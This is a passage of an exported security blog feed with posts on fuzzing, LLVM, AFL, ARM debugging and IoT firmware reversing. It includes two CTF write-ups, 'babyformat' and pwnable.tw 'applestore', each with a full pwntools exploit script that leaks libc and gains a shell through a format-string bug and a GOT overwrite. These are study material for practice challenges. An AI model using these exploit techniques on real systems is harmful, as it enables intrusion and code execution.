queue. The fuzzer applies a power scheduling against the seed with the goal of giving those seeds that are considered to be “closer” to the target sites more mutation chances, i.e, energy. Specifically, this is achieved through a power function, which is a combination of the covered function similarity and the basic block trace distance. For each newly generated test seed during mutation, after capturing its execution trace, the fuzzer will calculate the covered function similarity and the basic block trace distance based on the utilities. For each input execution trace, its basic block trace distance is calculated as the accumulated basic block level distances divided by the total number of executed basic blocks; and its covered function similarity is calculated based on the overlapping of current executed functions and the target function trace closure, as well as the function level distance. After the energy is determined, the fuzzer adaptively allocates mutation budgets on two different categories of mutations according to mutators’ granularities on the seed(coarse-grained mutations and fine-grained mutations). Afterwards, the fuzzer evaluates the newly generated seeds to prioritize those that have more energy or that have reached the target functions. Fuzzing Machine Learning ModelTensorFuzz: Debugging Neural Networks with Coverage-Guided Fuzzing(18) paper source code Coverage-Guided Fuzzing for Deep Neural Networks(18) paper Kernel FuzzingRAZZER: Finding Kernel Race Bugs through Fuzzing(oakland 19) paper source code kAFL: Hardware-Assisted Feedback Fuzzing for OS Kernels(Usenix Security 17) paper source code Fuzzing File Systems via Two-Dimensional Input Space Exploration(oakland 19) paper PeriScope: An Effective Probing and Fuzzing Framework for the Hardware-OS Boundary(NDSS 19) paper source code Anti-FuzzingFUZZIFICATION: Anti-Fuzzing Techniques(Usenix 19) paper source code ANTIFUZZ: Impeding Fuzzing Audits of Binary Executables(Usenix 19) paper data IoT FuzzingIOTFUZZER: Discovering Memory Corruptions in IoT Through App-based Fuzzing(NDSS 18) paper FIRM-AFL: High-Throughput Greybox Fuzzing of IoT Firmware via Augmented Process Emulation(Usenix Security 19) paper code Evaluate FuzzingEvaluating Fuzz Testing(CCS 18) paper They found that: Most papers failed perform multiple runs, and those that did failed to account for varying performance by using a statistical test. Many papers measured fuzzer performance not by counting distinct bugs, but instead by counting “unique crashes” using heuristics such asAFL’s coverage measure and stack hashes. Many papers used short timeouts, without justification. Many papers did not carefully consider the impact of seed choices on algorithmic improvements. Papers varied widely on their choice of target programs.]]></content>
      <categories>
        <category>fuzzing</category>
      </categories>
      <tags>
        <tag>fuzzing</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[os tutorial]]></title>
    <url>%2F2018%2F09%2F27%2Fos-tutorial%2F</url>
    <content type="text"><![CDATA[之前一直想了解OS的流程，直到在逛github的时候看到os-tutorial，这是一个比较适合小白了解OS，并手动构建一个OS的项目，先在此mark一下，此项目还在持续更新中~]]></content>
      <tags>
        <tag>OS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[llvm gold build]]></title>
    <url>%2F2018%2F09%2F27%2Fllvm-gold%2F</url>
    <content type="text"><![CDATA[Binutils BuildingDownload binutils source code1git clone --depth 1 git://sourceware.org/git/binutils-gdb.git binutils Build binutils1234mkdir buildcd build../binutils/configure --enable-gold --enable-plugins --disable-werrorsudo make install LLVMgold.so buildDownload LLVM source code1https://github.com/llvm-mirror/llvm.git Build LLVM with gold-plugin1234mkdir buildcd buildcmake ../llvm -DLLVM_BINUTILS_INCDIR=&quot;path/to/binutils/include&quot;make -j($nproc) And the LLVMgold.so will appear in the lib folder. Copy1234sudo cp lib/LLVMgold.so /usr/local/libsudo mkdir /usr/lib/bfd-pluginssudo cp lib/LLVMgold.so /usr/lib/bfd-pluginssudo cp lib/libLTO.so /usr/lib/bfd-plugins]]></content>
      <categories>
        <category>llvm</category>
      </categories>
      <tags>
        <tag>llvm</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[LLVM添加sanitizer]]></title>
    <url>%2F2018%2F08%2F28%2Fadd-sanitizer%2F</url>
    <content type="text"><![CDATA[有的时候需要在编译器LLVM上添加自己写的sanitizer，比如自己写的sanitizer名字叫做Bitype，想通过指定-fsanitize=bitype来开启Bitype sanitizer，则需要如下步骤: 在clang/Basic/Sanitizers.def文件中添加SANITIZER(“bitype”, Bitype) 在clang/Driver/SanitizerArgs.h中添加needsBitypeRt函数 在clang/lib/Deriver/ToolChain.cpp文件中getSupportedSanitizers()函数添加Res对Bitype的支持]]></content>
      <categories>
        <category>llvm</category>
      </categories>
      <tags>
        <tag>llvm</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[afl fork server]]></title>
    <url>%2F2018%2F08%2F06%2Fafl-fork-server%2F</url>
    <content type="text"><![CDATA[前言fuzz解析数据的库函数的方法一般是找一个简单的二进制来测试库函数的功能，通过生成不同的输入来不断地运行该二进制程序。一般是通过fork和execve来生成子进程运行目标二进制程序，fuzz程序通过waitpid()函数来等待子进程退出，如果子进程发出SIGSEGV或SIGABORT等信号，则证明子进程崩溃了，此时可能会发生了memory corruption bugs。然而没有一个输入，就调用ececve()函数来进行程序的链接，库函数的初始化等操作，大大地降低了fuzzing的效率[1]。AFL通过在目标程序中插入fork server的逻辑代码来保证在fuzzing的时候只进行一次程序的链接，库函数的初始化等操作，而通过fork()函数的copy-on-write机制，大大提高了fuzzing的效率。 fork server通过在二进制程序中插入fork server代码，该fork server会在main函数之前执行，它会暂停，等待AFL fuzzing端的输入，当AFL fuzzing端”发号施令”给fork server之后，fork server此时就通过fork()函数来生成子进程，子进程继续main函数的逻辑，由于fork server已经将各种资源都加载好，所以每次子进程只需要执行main函数的代码即可。 上面的例子是在afl中的llvm_mode文件夹中的afl-llvm-rt.o.c文件中定义的，fork server的逻辑也是比较简单，一个while循环，从FORKSRV_FD文件中读取AFL端给传来的数据，其中FORKSRV_FD是一个管道的一端，负责从AFL端读取数据。如果AFL端传来数据，则证明此时AFL的输入已准备好，则可以通过fork()来生成一个子进程，来运行main函数，进行fuzzing。 由于AFL进程与要fuzzing的进程不是父子关系(AFL与fork server是父子关系，fork server与要fuzzing的进程是父子关系)。所以AFL通过管道与fork server进程进行通信，而fork server通过waitpid()函数等待要fuzzing的子进程完成，得到其退出是的状态status，并将status通过管道传给AFL进程。 其中在afl-fuzz.c中的init_forkserver函数中，是对管道进行的初始化，感兴趣的可以看一下。 引用 Fuzzing random programs without execve(). https://lcamtuf.blogspot.com/2014/10/fuzzing-binaries-without-execve.html]]></content>
      <categories>
        <category>fuzzing</category>
      </categories>
      <tags>
        <tag>fuzzing</tag>
        <tag>afl</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[AFL Fuzzing with ASAN]]></title>
    <url>%2F2018%2F07%2F31%2Fafl-asan%2F</url>
    <content type="text"><![CDATA[前言AFL是使用比较广泛的fuzzing工具，ASAN(AddressSanitizer)是google的一个非常高效的内存错误检测工具，其能够检查出UAF,Heap/Stack buffer overflow, Use after return, Use after scope, Initialization order bugs and Memory leaks。这两者都有基于llvm的版本，所以将这两者相结合效果也是非常好的。 Problem在用AFL和ASAN来fuzzing heartbleed(教程链接afl-training)的时候出现了一个问题: 123Since it seems to be built with ASAN and you have a restrictive memory limit configured, this is expected; please read /usr/local/share/doc/afl/notes_for_asan.txt for help 这是因为ASAN工具是跟踪所有内存的，所以理论上可能需要的内存比较大，在32位系统中，最多占用800多MB内存。在64位系统中，ASAN的shadow memory的理论上占用的最大内存是17.5TB和20TB，而一般的电脑并没有这么大的内存，所以可能会使电脑死机。所以AFL会在64位机器运行64位程序的时候，报出这种错误。链接也提供了这种情况的解决方法。 实际上，以上最大内存只是理论上的，一般运行的程序shadow memory所占用的内存并没有这么多，所以第一种解决方法就是使用-m none选项，来忽略此错误: 1afl-fuzz -i in -o out -m none ./executable 第二种方法就是使用cgroup来限定改程序使用的资源： 1sudo ~/afl/experimental/asan_cgroups/limit_memory.sh -u usename afl-fuzz -i in -o out -m none ./executable 第二种方法是比较稳妥的方法，并不会对系统造成非常大的影响，因为其限定了程序所使用的内存资源。 引用 AFL: http://lcamtuf.coredump.cx/afl/ ASAN: https://github.com/google/sanitizers/wiki/AddressSanitizer afl-training: https://github.com/ThalesIgnite/afl-training/tree/master/challenges/heartbleed]]></content>
      <categories>
        <category>fuzzing</category>
      </categories>
      <tags>
        <tag>fuzzing</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[记一次Format String的利用(格式化字符串不在栈上)]]></title>
    <url>%2F2018%2F07%2F29%2Fformat-string%2F</url>
    <content type="text"><![CDATA[前言这两天做了一个CTF的题目，该题目的二进制链接。该题目的逻辑非常简单，就是接受输入，并将其打印，在打印的时候利用了printf函数，很明显是个format string漏洞。但由于格式化的字符串并没有在栈中，所以利用起来有一点困难，在此记录一下自己利用的方法。 格式化字符串漏洞 格式化字符串函数可以接受可变数量的参数，并将第一个参数作为格式化字符串，根据其来解析之后的参数 参考。 一般发生格式化字符串漏洞的原因是因为并没有指定第一个参数格式化字符串(或者格式化字符串可以更改)，所以给了攻击者一个可以控制格式化字符串的机会，进而可以实现任意的内存读写能力。其中能触发格式化字符串漏洞的函数有如下几个: scanf, printf, vprintf, vfprintf, sprintf, vsprintf, vsnprintf, setproctitle, syslog等，如果想比较系统的了解格式化字符串漏洞，可以访问链接。 程序分析首先拿到程序，先分析一下该程序的保护措施: 发现其除了canary保护之外，其它防护都开了(主要是输入的buff并不在栈上，所以并没有canary保护，并不代表着可以通过buffer overflow来溢出返回地址-_-)。 然后扔给IDA pro分析其逻辑: 该程序的逻辑非常简单，首先是给你三次机会，让你进行格式化字符串攻击，COUNT是全局变量，COUNT=3。接下来是exploit_me函数，该函数的逻辑更加简单，现将BUFF变量清空，然后读入13个字节，再将输入的字符串输出，在输出的时候会发生格式化字符串的攻击。其中BUFF是一个全局变量，大小是16个字节。该程序攻击起来主要有如下几个难点: 由于输入的长度有限(只有13个字节)，并且只允许进行三次尝试 格式化字符串不在栈上，进行任意内存的读写存在一定的难度 漏洞利用接下来主要针对以上提出来的两个难点进行攻击。 修改计数变量由于只允许三次输入，并且输入的长度有限，很难进行有效的攻击，所以接下来思路就是首先利用这三次输入将控制输入的计数变量修改掉，使其能够进行多次输入。 有上面程序分析可以看到，计数变量有两个：MACRO_COUNT局部变量和COUNT全局变量，只要将其中一个值修改掉，就可以进行多次输入，方便进行接下来的攻击。所以现在思路主要如下： 泄露地址：包括栈的地址和程序的地址。 修改栈的内容：保证栈中有MACRO_COUNT或者COUNT的地址。 修改MACRO_COUNT或者COUNT的值。 以上的每一个目的都可以利用一次format string攻击实现。 泄露地址 上面该图是在printf调用前的栈的内容，可以看出第一个参数是格式化字符串的地址，而接下来的一个内存单元0xffffcf6c存储的也是格式化字符串的地址，所以可以通过泄露该内存单元的内容来泄露BUFF变量的地址，从而可以算出程序的基址。接下来，ebp的内存单元存储的是saved ebp，上一个函数的ebp值，该值是栈的地址，所以可以通过泄露该地址来泄露栈的地址。所以可以输入 1%p%6$p 来泄露栈的地址和程序的地址。 修改栈的内容由于格式化字符串不在栈上，所以想通过格式化字符串来修改某个内存单元的值，首先得先把该内存的地址写入栈中。通过上面分析我们知道了栈上的地址和程序的地址，通过偏移也能计算出MACRO_COUNT和COUNT的地址。接下来则需要将MACRO_COUNT或者COUNT的地址写入栈中。在此，我选择将MACRO_COUNT的地址写入到栈中，理由如下: 从上图可以看到0xffffcf84地址处存储的是内存单元0xffffd044的地址，而0xffffd044存储的值是0xffffd224，也是栈上的一个地址，而MACRO_COUNT也是栈上的变量，其地址与0xffffd224的高16位应该是相等的，所以此时只需要修改0xffffd044地址存储的低16位即可。这样能保证攻击顺利进行（如果修改整个32位的话，则输出的数太多，需要花费很长时间，还有一个原因是导致输入的字符串过长，没办法实现攻击）。 所以具体的攻击手段就是将0xffffd044内存单元存储的值的低16位改为MACRO_COUNT的高位byte地址即可。 假设MACRO_COUNT的地址为addr。则可以输入 1&quot;%&quot; + str(addr &amp; 0xffff) + &quot;d&quot; + &quot;%9$hn&quot; 即可。 修改MACRO_COUNT的值通过前面的步骤，实现了将0xffffd224的地址处存储了MACRO_COUNT的地址，而0xffffd044相对于0xffffcf60(printf的第一个参数)的offset为0xE4,则可以进行如下输入使的MACRO_COUNT的高位为0xFF。 1&quot;%255d%57$hhn&quot; 其中57为0xE4/4，因为地址是4字节的。 读写任意内存通过以上的努力，我们可以进行多次的输入。由于输入的格式化字符串是全局变量，并不在栈上，我们就不能通过一次简单的输入就能读写任意内存，此时需要通过格式化字符串来间接的修改内存地址到栈上。具体思路如下： 如果我想要将地址addr写入到栈上的某个内存单元上去，设栈上的该内存单元地址为stack_addr。则我需要一次中介来完成此类攻击。 我们再来看一下调用printf时栈中的布局： 可以看到0xffffcf84和0xffffcf88两个内存单元存储的内容是栈上的地址，而其又指向了一个栈上的地址。所以可以通过格式化字符串将0xffffd044地址处的内容改为stack_addr+2，将0xffffd04c地址处的内容改为stack_addr，然后再通过$hn分别向stack_addr+2处写入addr的高16位((addr&amp;0xffff0000)&gt;&gt;16)，stack_addr处写入addr的低16位(addr&amp;0xffff)。 具体的攻击过程如下: 123456789101112131415161718192021222324252627282930def modify(address, modifiedAddress): print("modified address is %x" % modifiedAddress) #puts_got_run = puts_got + binary_base modifiedAddress_high = (modifiedAddress &amp; 0xffff0000) &gt;&gt; 16 #log.info("strcmp got run high %x " % strncmp_got_run_high) modifiedAddress_low = modifiedAddress &amp; 0xffff temp_low = (address + 0x2) &amp; 0xffff print("temp low is %x" % temp_low) payload3 = "%"+str(temp_low) + "d" + "%9$hn" p.sendline(payload3) p.recvrepeat(0.5) temp_high = (address) &amp; 0xffff print("temp high is %x" % temp_high) payload4 = "%" + str(temp_high) + "d" + "%10$hn" p.sendline(payload4) p.recvrepeat(0.5) payload5 = "%" + str(modifiedAddress_high)+"d" + "%57$hn" print("got run high is %x " % (modifiedAddress_high)) p.sendline(payload5) # p.recv() # sleep(1) p.recvrepeat(0.5) payload6 = "%" + str(modifiedAddress_low)+"d"+"%59$hn" print("got run low is %x " % (modifiedAddress_low)) p.sendline(payload6) p.recvrepeat(0.5) 其中address就是此处的stack_addr，modifiedAddress就是此处的addr。 有了可以向栈中写入任意地址的能力，我们就可以进行libc地址的泄露和修改返回地址及其参数了。 泄露libc地址通过以上的方法，我们可以将printf函数的got地址写入到栈上，然后通过%s读取got的内容，从而泄露libc的地址。由于改题目并没有提供具体的libc版本，所以可以通过泄露的printf的地址，到libc database search网站进行查询。通过绣楼libc地址，我们可以得到system的地址和”/bin/sh”字符串的地址。 修改返回地址和参数由于泄露了libc的地址，所以将main函数的返回地址修改为system的地址，并将其参数设为”/bin/sh”字符串的地址，输入EXIT，即可完成攻击。 整个的攻击脚本如下: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106from pwn import *def modify(address, modifiedAddress): print("modified address is %x" % modifiedAddress) #puts_got_run = puts_got + binary_base modifiedAddress_high = (modifiedAddress &amp; 0xffff0000) &gt;&gt; 16 #log.info("strcmp got run high %x " % strncmp_got_run_high) modifiedAddress_low = modifiedAddress &amp; 0xffff temp_low = (address + 0x2) &amp; 0xffff print("temp low is %x" % temp_low) payload3 = "%"+str(temp_low) + "d" + "%9$hn" p.sendline(payload3) p.recvrepeat(0.5) temp_high = (address) &amp; 0xffff print("temp high is %x" % temp_high) payload4 = "%" + str(temp_high) + "d" + "%10$hn" p.sendline(payload4) p.recvrepeat(0.5) payload5 = "%" + str(modifiedAddress_high)+"d" + "%57$hn" print("got run high is %x " % (modifiedAddress_high)) p.sendline(payload5) # p.recv() # sleep(1) p.recvrepeat(0.5) payload6 = "%" + str(modifiedAddress_low)+"d"+"%59$hn" print("got run low is %x " % (modifiedAddress_low)) p.sendline(payload6) p.recvrepeat(0.5)#p = process('./babyformat')pp = ELF('./babyformat')p = remote('104.196.99.62', port = 2222)p.recvuntil('==== Baby Format - Echo system ====')puts_got = pp.got['puts']# puts_offset = 0x5fca0# bin_sh_offset = 0x15ba0b# system_offset = 0x3ada0system_offset = 0x3cd10puts_offset = 0x67360bin_sh_offset = 0x17b8cf## leak addressp.sendline('%p%6$p')#sleep(3)p.recvline()leaked = p.recvline()addr_buff = int(leaked[2:10], 16)binary_base = addr_buff - 0x202c log.info("BUFF address is %x" % addr_buff)addr_stack_ebp = int(leaked[12:20], 16) - 0x20log.info("ebp address is %x" % addr_stack_ebp)#ebp_low_four = addr_stack_ebp &amp; 0xffff# variable MACRO_COUNT address's low four bytescount_low_four = (addr_stack_ebp + 0x17) &amp; 0xffffpayload1 = "%" + str(count_low_four) + "d" + "%9$hn"p.sendline(payload1)p.recvrepeat(1)payload2 = "%255d%57$hhn"p.sendline(payload2)p.recvrepeat(1)####### No problem up ##############################puts_got_run = puts_got + binary_basemodify(addr_stack_ebp + 0x20, puts_got_run)p.recvrepeat(1)#leak the strncmp addresspayload7 = "%14$s"p.sendline(payload7)# print(p.recv())#sleep(1)puts_address = u32(p.recvline()[0:4])log.info("puts address is %x " % puts_address)libc_base = puts_address - puts_offsetlog.info("libc base address is %x" % libc_base)#############leak libc address done ############ret_address = addr_stack_ebp + 0x34arg_address = addr_stack_ebp + 0x3csystem_address = system_offset + libc_basebin_sh_address = bin_sh_offset + libc_basemodify(ret_address, system_address)modify(arg_address, bin_sh_address)#raw_input()p.recvrepeat(1)#p.sendline('EXIT')p.interactive() References ctf-wiki:格式化字符串漏洞原理介绍: https://ctf-wiki.github.io/ctf-wiki/pwn/fmtstr/fmtstr_intro/ lib database search: https://libc.blukat.me/]]></content>
      <categories>
        <category>pwnable</category>
      </categories>
      <tags>
        <tag>pwnable</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Intel linux调试arm程序]]></title>
    <url>%2F2018%2F07%2F26%2Fqemu-arm%2F</url>
    <content type="text"><![CDATA[安装qemu sudo apt-get install qemu 安装arm文件所需要的动态库 sudo apt-get install gcc-multilib-arm-linux-gnueabi sudo apt-get install gcc-armhf-cross 此时在/usr/arm-linux-gnueabihf/lib/文件夹中会有安装的这些库，有的arm文件在动态链接的时候是直接指向的/lib/ld-linux-armhf.so.3文件的，所以此时需要将/usr/arm-linux-gnueabihf/lib/ld-linux-armhf.so.3软连接到/lib/文件夹下: ln -s /usr/arm-linux-gnueabihf/lib/ld-linux-armhf.so.3 /lib/ld-linux-armhf.so.3 运行 在运行前添加/usr/arm-linux-gnueabihf/lib文件夹到LD_LIBRARY_PATH环境变量里面: export LD_LIBRARY_PATH=/usr/arm-linux-gnueabihf/lib/:$LD_LIBRARY_PATH qemu-arm运行arm程序: qemu-arm -g 1234 /path/of/arm-executable, 即在1234端口上开启调试模式 调试 此时就可以在自己机器上进行调试改程序，既可以使用IDA pro进行远端调试，也可以使用gdb进行调试，此处介绍gdb调试 在调试前请确保自己安装了gdb-multiarch，如果没有安装，则 sudo apt install gdb-multiarch 用gdb打开待调试文件: gdb-multiarch /path/of/arm-executable 在gdb中连接调试端口: target remote 1234，调试即可 Enjoy it!!!]]></content>
      <categories>
        <category>qemu</category>
      </categories>
      <tags>
        <tag>qemu</tag>
        <tag>arm</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IoT firmware逆向之入门篇]]></title>
    <url>%2F2018%2F07%2F10%2Ffirmware-reverse%2F</url>
    <content type="text"><![CDATA[前言随着IoT(Internet of Things)设备快速增长，IoT设备的安全也逐渐引起大家的注意。如论文[1]所述，IoT的安全问题主要包括如下方面: 感知层安全。IoT的感知层主要包括wireless sensor networks, RFID, 802.11, BLE(Bluetooth low energy), zigbee and etc. 这些通信网络本身可能会存在一些安全问题。 网络层安全。IoT的网络层安全主要包括通信协议的安全，隐私泄露等问题。 应用层安全。应用层安全主要包括软件安全，认证问题，隐私数据的保护，认证和校验的问题。 它们的关系如下图所示： 图1 IoT安全概览 由于IoT设备对于能耗和及时性的要求比较高，所以其具体实现(操作系统及软件的保护机制)都和PC端和手机端有很大的区别。由于能耗的要求，大部分IoT设备都采用低能耗的处理器(比如arm Contex-M系列)，这些处理器大部分都没有MMU，所以没有虚拟地址到物理地址的转换，更无法提供ASLR等防护(arm Contex-M由于有MPU功能，能提供比较局限的内存防护机制)；由于实时性的要求，大部分采用的系统是RTOS(Real Time Operating System)或者直接是bare mental system，其每个设备的内存布局可能都是固定的。所以IoT设备的应用层的安全也是非常严峻的。 Firmware在IoT设备中，其代码和数据一般存储在ROM中(大部分都是Flash，关于Flash的种类可以访问here来了解一下)。一般将这部分代码和数据称为Firmware(可能表述不准确，欢迎指正)。Firmware没有一个固定的格式，它更像是一个binary blob，具体的格式和解析根据设备的不同而有所不同。 一般获取firmware的方式主要有三种: 从厂商官网下载或者逆向厂商的App获得 劫持(中间人攻击)firmware更新过程 硬件逆向，直接读取存放firmware的flash或者UART串口调试 由于现在有很多IoT设备都是Over-The-Air Firmware Update，所以有很多厂商并不会在官网上提供firmware的下载，所以一般比较通用的获取firmware的方法都是通过硬件逆向方法。关于硬件逆向，推荐两篇文章物联网硬件安全分析基础-固件提取和物联网硬件安全分析基础-串口调试。 逆向Firmware最近在查看关于firmware逆向有关的资料，发现有如下几个问题: 不知道哪些是代码段和数据段 不知道内存布局，即不知道firmware的基址 …… 在浏览了很多教程之后，发现了关于Marvell IoT SDK的一些小经验，特总结下来，以备日后查阅。具体的教程可参阅Inside The Bulb: Adventures in Reverse Engineering Smart Bulb Firmware和dustcloud。dustcloud做了挺多关于小米iot逆向的工作的，其中小米的yeelight和智能网管设备的firmware都是采用的Marvell IoT SDK。由于dustcloud直接提供了yeelight的firmware，所以就省去了我硬件逆向提取firmware的步骤了，我直接从dustcloud下载firmware。 Inside The Bulb: Adventures in Reverse Engineering Smart Bulb Firmware介绍了如何将Marvell IoT SDK格式的firmware提取出代码，并将其合并成elf文件的，由于里面细节有限，我在此重复了里面的步骤，并总结出了一些方法。 首先在二进制编辑器中可以看到该firmware是MRVL(Marvell)的，而该文件含有一些entries, 表示了不同”段”的偏移，大小和地址信息: 12345DWORD magic; // Always 0x2DWORD offset; // Offset into the fileDWORD size; // Size of the sectionDWORD address; // Memory address where this section will be loadedDWORD unknown; // Probably some kind of checksum? 具体的firmware二进制数据如下图所示: 图2 firmware二进制 可知其含有三个不同的entry，可使用dd工具将这三个不同的”段”提取出来: 123dd if=yeelink.light.strip1.bin bs=1 skip=200 count=12824 of=s1.bindd if=yeelink.light.strip1.bin bs=1 skip=13024 count=299984 of=s2.bindd if=yeelink.light.strip1.bin bs=1 skip=313008 count=5420 of=s3.bin 此时，得到了三个二进制文件，使用arm-none-eabi-objcopy将其合并成ELF文件: 1arm-none-eabi-objcopy -I binary -O elf32-littlearm --adjust-vma 0x100000 --binary-architecture arm --rename-section .data=.text,contents,alloc,load,readonly,code --add-section .text2=s2.bin --set-section-flags .text2=contents,alloc,load,readonly,code --change-section-address .text2=0x1f0032e0 --add-section .text3=s3.bin --set-section-flags .text3=contents,alloc,load,readonly,code --change-section-address .text3=0x20000040 s1.bin firmware_yeelink.elf 上面的命令就是将三个文件合并成一个ELF文件，并且分别将其置为不同的section，设置virtual address。 如果直接将生成的文件firmware_yeelink.elf扔到IDA pro中会出现一个问题：由于objcopy生成的elf文件是可重定位类型(relocatable file)，扔到IDA中虚拟地址是从0开始的，并不是从0x100000开始的。 我最后终于找到一个方法：再使用ld链接器将可重定位类型的文件生成可执行类型(executable file)，并给每一个section添加虚拟地址: 1arm-none-eabi-ld --section-start=.text=0x100000 --section-start=.text2=0x1f0032e0 --section-start=.text3=0x20000040 firmware_yeelink.elf -o firmware.elf 此时扔给IDA，虚拟地址正确. （–未完待更–） 引用 [1] Mendez, Diego M., Ioannis Papapanagiotou, and Baijian Yang. “Internet of things: Survey on security and privacy.” arXiv preprint arXiv:1707.01879 (2017).]]></content>
      <categories>
        <category>iot</category>
      </categories>
      <tags>
        <tag>iot firmware</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pwnable.tw之applestore]]></title>
    <url>%2F2018%2F07%2F01%2Fpwnable-tw%2F</url>
    <content type="text"><![CDATA[该题是模拟了apple的商店，来售卖apple的各种产品，其提供了6个功能: 1: 展示商店的商品 2: 添加商品到购物车 3: 从购物车里面将某一商品删除 4: 展示购物车里面的商品 5: 结算 6: 退出 其中，购物车是用双向链表实现的，其每一项的结构如下，其在32位机器下的大小为16字节。链表头是一个全局变量，存在0x804b068处。123456struct cart_entry&#123; char* product_name, int price, cart_entry* next, cart_entry* previous&#125;; 程序分析下面简单的分析添加，删除，购物车输出和结算功能。 添加商品添加商品是在add()函数中实现的，其在ida中反汇编出来的结果如下图所示： 该函数的逻辑也比较简单，其首先通过malloc在堆上分配16自己大小的空间，然后进行初始化，最后将该结构体添加到双向链表中。 结算结算功能是在checkout()函数中实现的，其在ida中反汇编出来的结果如下图所示: 由上图可知，其当满足总金额=7174时，则将一个临时变量v2(位于ebp-0x20)加入到双向链表中，而ebp-0x20处的内存如果能被我们所控制的话就可能进行攻击(泄露内存等)。而通过分析可知在cart()函数接收输入的时候我们的输入是能够覆盖到ebp-0x20处的。所以此时只需要满足购物车的总金额=7174即可。我们观察到一共有4种不同的价格(199,299,399,499),我们可以列个方程求出多种解。最直接的方法是交给z3求解器，具体求解如下: 12345678In [1]: from z3 import *In [2]: x = Int('x')In [3]: y = Int('y')In [4]: m = Int('m')In [5]: n = Int('n')In [7]: solve(x&gt;=0,y&gt;=0,m&gt;=0,n&gt;=0,199*x+299*y+399*m+499*n==7174)[y = 20, x = 6, n = 0, m = 0] 即可求出结果，使得满足购物车总金额=7174. 输出购物车输出购物车功能是在cart()函数中实现的，其在ida中反汇编出来的结果如下图所示： 在cart()函数中，有一个可以利用的地方就是在my_read()时，用户能输入0x15大小的数据，而输入的数据存进的内存即在ebp-0x22开始处，正好可以将checkout中的添加到双向链表的临时变量(ebp-0x20)给覆盖掉。如果我们将临时变量的第一个元素(存放商品名称)的地方存入atoi的got地址，则可以将libc的地址泄露出来。 删除删除功能是在delete()函数中实现的，其在ida中反汇编出来的结果如下图所示: 删除操作就是在双向链表中找到要删除的项，然后就是正规的双向链表操作。由于我们可以通过输入控制ebp-0x20处的项的数据，如果我们将next和previous元素修改成特定的值，就有可能修改got表项，此时就造成了控制流的劫持。一开始我是将next修改成got[‘atoi’]-0xc，将previous改成system的地址，最后发生segment fault. 仔细一想，此时确实将atoi的got表项改成了system的地址了，但是也需要将system.addr+8赋值为got[‘atoi’]-0xc，而system.addr+8处是代码段，改程序又开了NX保护，所以会发生segment fault. Attack通过前面的分析，我们可以利用cart()函数覆盖ebp-0x20处的内容，进而可以进行内存泄露攻击，将glibc的地址和栈中的地址泄露出来。通过delete函数，我们可以修改某一内存处的内容，如果我们修改ebp的值，使其在leave操作(mov esp, ebp; pop ebp)时，将修改后的ebp值赋给ebp寄存器，从而控制栈，进而修改got表项。 内存泄露通过前面的分析我们可以看到在cart()函数中，如果将ebp-0x20处的内容覆盖为got[‘atoi’]的地址，则在cart函数输出的时候，就可以将atoi的got表项的内容泄露出来，即glibc的atoi函数的地址。 泄露栈中的地址，一开始没有思路，通过网上的write up，学到了一个方法：glibc有一个全局变量’environ’,该变量保存用户环境，其是一个char**类型，在程序运行时，将用户环境指向栈上，所以environ存储的地址就是栈上的地址，如果我们将environ变量的内容泄露出来也就泄露出来了栈上的地址。 修改Got此前尝试直接将atoi的got表项改为system的地址会失败，通过查找write up发现有一个比较巧妙的方法: 通过修改子函数(delete函数)的saved ebp值为got[‘atoi’]+0x22的值，则返回delete函数到handle函数时，此时ebp即是got[‘atoi’]+0x22，此时通过my_read()函数将用户输入的值放入ebp-0x22处，即got[‘atoi’]，此时可以达到修改atoi的got表项的目的。而修改saved ebp值可以通过delete函数来实现。 完整攻击完整攻击代码如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384from pwn import *'''control ebp to control the stack, so can modify atoi got'''def addDevice(device_num): p.recvuntil('&gt;') p.sendline('2') p.recvuntil('Device Number&gt;') p.sendline(device_num)def checkout(): p.recvuntil('&gt;') p.sendline('5') p.recvuntil('(y/n) &gt;') p.sendline('y')def cart(payload): p.recvuntil('&gt;') p.sendline('4') p.recvuntil('(y/n) &gt;') p.sendline(payload)def delete(payload): p.recvuntil('&gt;') p.sendline('3') p.recvuntil('Item Number&gt;') p.sendline(payload)if __name__ == '__main__': #p = process('./applestore', env=&#123;'LD_PRELOAD' : './libc_32.so.6'&#125;) p = remote('chall.pwnable.tw', 10104) apple = ELF('./applestore') libc = ELF('./libc_32.so.6') #print("pid : " + str(proc.pidof(p))) #raw_input('attach me ') for i in range(20): addDevice('2') for i in range(6): addDevice('1') checkout() # leak libc address payload = 'y\x00' + p32(apple.got['atoi']) + '\x00\x00\x00\x00' * 3 #addDevice(payload) cart(payload) p.recvuntil('27: ') atoi_addr = u32(p.recvline()[0:4]) atoi_libc = libc.symbols['atoi'] libc_base = atoi_addr - atoi_libc log.info('atoi address is ' + hex(atoi_addr)) log.info('atoi address in libc is ' + hex(atoi_libc)) log.info('libc base address is ' + hex(libc_base)) libc.address = libc_base # leak the stack address environ_addr = libc.symbols['environ'] payload = 'y\x00' + p32(environ_addr) + '\x00\x00\x00\x00' * 3 cart(payload) p.recvuntil('27: ') environ_addr = u32(p.recvline()[0:4]) log.info('environ address is ' + hex(environ_addr)) ebp_address = environ_addr - 0x104 # delete, write the ebp to the atoi+0x22 payload = '27' + p32(0x08049002) + p32(0) + p32(apple.got['atoi'] + 0x22) + p32(ebp_address - 0x8) # gdb.attach(p, ''' # break *0x8048a3d # ''') delete(payload) # attack, set the atoi got to system addr, and execute the system('/bin/sh') payload = p32(libc.symbols['system']) + ';/bin/sh\x00' p.recvuntil('&gt;') p.sendline(payload) p.interactive()]]></content>
      <categories>
        <category>pwnable</category>
      </categories>
      <tags>
        <tag>pwnable</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[gdb无法找到main]]></title>
    <url>%2F2018%2F01%2F22%2Fgdb%E6%97%A0%E6%B3%95%E5%AE%9A%E4%BD%8Dmain%2F</url>
